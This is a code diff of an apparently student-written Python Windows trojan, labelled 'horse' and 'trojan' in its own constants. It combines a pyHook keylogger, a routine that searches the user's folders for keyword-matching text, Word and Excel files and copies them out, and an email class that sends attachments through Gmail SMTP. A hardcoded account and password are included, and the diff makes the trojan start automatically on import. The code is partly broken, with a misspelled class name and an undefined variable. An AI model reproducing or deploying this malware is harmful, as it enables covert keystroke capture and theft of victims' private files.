@@ -1,4 +1,4 @@
-__author__ = 'nassan'
+__author__ = 'shimon'
 import os
 import pythoncom
 import pyHook
@@ -13,6 +13,11 @@ import glob
 import win32com.client as win32
 import xlrd
 import re
+import pywintypes
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 
 # import ctypes
 # import win32api
@@ -83,11 +88,12 @@ class KeyLogger(object):
 
     def stopkeylogger(self):
         # Let the keylogger run for seconds
-        time.sleep(5)
+        time.sleep(100)
         # log_message = "Posting message on thread ", str(self.running_keylogger_thread_id), "\n"
         # self.log_controller.writeMessage(log_message)
         # ctypes.windll.user32.PostQuitMessage(0)
         # win32api.PostThreadMessage(self.running_keylogger_thread_id, win32con.WM_QUIT, 0, 0)
+        
         self.should_keylogger_stop = True
         self.log_controller.writeMessage("Switched should_keylogger_stop flag to True\n")
 
@@ -109,26 +115,28 @@ class KeyLogger(object):
 
 class Constants:
     """Contains the Constants for the horse"""
+    USER_NAME=os.getlogin()
+    TEMP= os.path.join(r"C:\Users",USER_NAME)
+    SEARCH_ROOT=TEMP
     ROOT = r"C:"
-    LOG_FILE_LOCATION = r"C:\Users\nassan\Copy\trojan_log.txt"
+    LOG_FILE_LOCATION = os.path.join(TEMP,r"Desktop\trojan_log.txt")
     APPEND_MODE = 'a'
     OVERWRITE_MODE = 'w'
     READ_MODE = 'r'
     MAX_LOG_SIZE = 1000000
-    SEARCH_ROOT=r"C:\Users\nassan\Copy\trojan_test"
-    WORD_LIST_PATH = r"C:\Users\nassan\Desktop\word_list.txt"
+    WORD_LIST = ["shimon","with"]
     FILE_LIST_PATH = r"C:\Users\nassan\Desktop\file_list.txt"
-    DESTINATION_FOLDER_PATH = r"C:\Users\nassan\Downloads\trojan_copy"
+    DESTINATION_FOLDER_PATH = os.path.join(TEMP,r"Desktop\Horse\madaf")
     CHROME_PROCESS_NAME = "chrome.exe"
     ENDLINE = "\n"
-    KEY_STROKES_LOG = r"C:\Users\nassan\Copy\key_strokes_log.txt"
-    EMAIL_SERVER_NAME = r"smtp.gmail.com:587"
-    EMAIL_SOURCE = ""
+    KEY_STROKES_LOG = os.path.join(TEMP,r"Desktop\key_strokes_log.txt")
+    EMAIL_SERVER_NAME = 'smtp.gmail.com:587'
+    EMAIL_SOURCE = "trojanhorsepy@gmail.com"
     EMAIL_DESTINATION_LIST = []
     EMAIL_CC_LIST = []
     EMAIL_SUBJECT_HEADER = ""
-    EMAIL_LOGIN = ""
-    EMAIL_PASSWORD = ""
+    EMAIL_LOGIN = "trojanhorsepy@gmail.com"
+    EMAIL_PASSWORD = "nattanshimon"
 
 
 class OSmanipulation(object):
@@ -157,7 +165,6 @@ class OSmanipulation(object):
                             list_of_existing_files.append(file_name)
         f.close()
         return list_of_existing_files
-
     def Copy_interesting_files(self):
             for root, dirs, files in os.walk(Constants.SEARCH_ROOT):      #רץ על כל התקיות
                 for each in files:      #רץ על כל הקבצים שבתוך התקיות
@@ -166,7 +173,7 @@ class OSmanipulation(object):
                         temp=os.path.join(root,temp)    #מחבר את הנתיב שנשלח ואת הנתיב שקבלנו בלולאה
                         try:    #לא להתייחס  צריך עזרה של זושא
                             file_to_check = open(temp)    #פותח את התקיה
-                            wordList = open(Constants.WORD_LIST_PATH, 'r')
+                            wordList = Constants.WORD_LIST
                             check = False
                             for word in wordList:   #רץ בתוך קובץ המילים
                                 try:
@@ -180,72 +187,72 @@ class OSmanipulation(object):
                             if check:     #אם הדגל עובד
                                 shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)   #מעביר את הקובץ לתקיה
                             file_to_check.close()
-                            wordList.close()
                         except IOError:
                             pass
 
                     if each.endswith('docx'):
                         temp = str(each)      #הופך את שם הקובץ לטקסט
                         temp = os.path.join(root, temp)    #מחבר את הנתיב שנשלח ואת הנתיב שקבלנו בלולאה
-                        s = "אלגוריתם"
-                        word = win32.gencache.EnsureDispatch('Word.Application')
-                        word.Visible = False
-                        z = s.encode()
-                        #check=False
-                        for infile in glob.glob(temp):
-                            check = False
-                            try:
-                                doc = word.Documents.Open(infile)
-                                for word_t in doc.Words:
-                                    if str(z) in str(str(word_t).encode()).replace(" ", ""):
-                                        check = True
-                                doc.Close()
-                                if check:     #אם הדגל עובד
-                                    shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)   #מעביר את הקובץ לתקיה
-
-                            except Exception:
-                                pass
+                        #s = "אלגוריתם"
+                        for s in Constants.WORD_LIST:
+                            word = win32.gencache.EnsureDispatch('Word.Application')
+                            word.Visible = False
+                            z = s.encode()
+                            #check=False
+                            for infile in glob.glob(temp):
+                                check = False
+                                try:
+                                    doc = word.Documents.Open(infile)
+                                    for word_t in doc.Words:
+                                        if str(z) in str(str(word_t).encode()).replace(" ", ""):
+                                            check = True
+                                    doc.Close()
+                                    if check:     #אם הדגל עובד
+                                        shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)   #מעביר את הקובץ לתקיה
+    
+                                except Exception:
+                                    pass
                     if each.endswith('xlsx'):
                         #try:
-                        word = str(str("שמעון").encode())
-                        temp = str(each)      #הופך את שם הקובץ לטקסט
-                        temp = os.path.join(root, temp)    #מחבר את הנתיב שנשלח ואת הנתיב שקבלנו בלולאה
-                        #print(word)
-                        try:
-                            workbook = xlrd.open_workbook(temp)
-                            na=workbook.sheet_names()
-                            na[0].replace(" ", "")
-                            #print(na)
-                            for a in na:
-                                worksheet = workbook.sheet_by_name(str(a))
-                                num_rows = worksheet.nrows - 1
-                                num_cells = worksheet.ncols - 1
-                                curr_row = -1
-                                while curr_row < num_rows:
-                                        curr_row += 1
-                                        row = worksheet.row(curr_row)
-                                        curr_cell = -1
-                                        while curr_cell < num_cells:
-                                                check = False
-                                                curr_cell += 1
-                                                # Cell Types: 0=Empty, 1=Text, 2=Number, 3=Date, 4=Boolean, 5=Error, 6=Blank
-                                                cell_type = worksheet.cell_type(curr_row, curr_cell)
-                                                cell_value = worksheet.cell_value(curr_row, curr_cell)
-                                                #print(cell_value)
-                                                cell_value = str(cell_value).replace(" ", "")
-                                                cell_value = cell_value.lower()
-
-                                                if str(str(cell_value).encode())in word:
-                                                    check = True
-                                                cell_value = str(str(cell_value).encode())
-                                                arra = [(a.start(), a.end()) for a in list(re.finditer(word, cell_value))]
-                                                if len(arra) >= 1:
-                                                    check = True
-                                                if check:     #אם הדגל עובד
-                                                    shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)   #מעביר את הקובץ לתקיה
-                        except Exception:
-                            pass
-
+                        for s in Constants.WORD_LIST:
+                            word = str(str(s).encode())
+                            temp = str(each)      #הופך את שם הקובץ לטקסט
+                            temp = os.path.join(root, temp)    #מחבר את הנתיב שנשלח ואת הנתיב שקבלנו בלולאה
+                            #print(word)
+                            try:
+                                workbook = xlrd.open_workbook(temp)
+                                na=workbook.sheet_names()
+                                na[0].replace(" ", "")
+                                #print(na)
+                                for a in na:
+                                    worksheet = workbook.sheet_by_name(str(a))
+                                    num_rows = worksheet.nrows - 1
+                                    num_cells = worksheet.ncols - 1
+                                    curr_row = -1
+                                    while curr_row < num_rows:
+                                            curr_row += 1
+                                            row = worksheet.row(curr_row)
+                                            curr_cell = -1
+                                            while curr_cell < num_cells:
+                                                    check = False
+                                                    curr_cell += 1
+                                                    # Cell Types: 0=Empty, 1=Text, 2=Number, 3=Date, 4=Boolean, 5=Error, 6=Blank
+                                                    cell_type = worksheet.cell_type(curr_row, curr_cell)
+                                                    cell_value = worksheet.cell_value(curr_row, curr_cell)
+                                                    #print(cell_value)
+                                                    cell_value = str(cell_value).replace(" ", "")
+                                                    cell_value = cell_value.lower()
+    
+                                                    if str(str(cell_value).encode())in word:
+                                                        check = True
+                                                    cell_value = str(str(cell_value).encode())
+                                                    arra = [(a.start(), a.end()) for a in list(re.finditer(word, cell_value))]
+                                                    if len(arra) >= 1:
+                                                        check = True
+                                                    if check:     #אם הדגל עובד
+                                                        shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)   #מעביר את הקובץ לתקיה
+                            except Exception:
+                                pass
     def exucuteFunction(self, file_path):
         # We need to decide whether to add a file_path to the Constants
         opened_file = open(file_path, Constants.READ_MODE)
@@ -285,6 +292,35 @@ class Email(object):
         self.server.sendmail(Constants.EMAIL_SOURCE, Constants.EMAIL_DESTINATION_LIST, self.header + body)
 
 
+
+class AttachMail():
+    def start_server(self):
+        self.mailServer = smtplib.SMTP("smtp.gmail.com", 587)
+        #mailServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)   # didn't work for me
+        self.mailServer.ehlo()
+        self.mailServer.starttls()
+        self.mailServer.ehlo()
+        self.mailServer.login(Constans.EMAIL_LOGIN ,Constans.EMAIL_PASSWORD)   
+    def stop_server(self):
+        self.mailServer.close()
+    def sendMail(self,to,subject,text,attach):
+        msg = MIMEMultipart()
+  
+        msg['From'] = Constans.EMAIL_LOGIN
+        msg['To'] = to
+        msg['Subject'] = subject
+      
+        msg.attach(MIMEText(text))
+      
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(open(attach, 'rb').read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition',
+                'attachment; filename="%s"' % os.path.basename(attach))
+        msg.attach(part)
+        self.mailServer.sendmail(gmail_name, to, msg.as_string()) 
+
+
 def kickOff():
     # Create the Keylogger object
     keylogger = KeyLogger()
@@ -297,10 +333,5 @@ def kickOff():
     start_keylogger_thread.start()
     stop_timer.start()
 
-import winreg
-key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                     'Software\Microsoft\Windows\CurrentVersion\Run',
-                     winreg.KEY_SET_VALUE)
-winreg.SetValueEx(key, winreg.REG_BINARY,)
-# kickOff()
+kickOff()
 
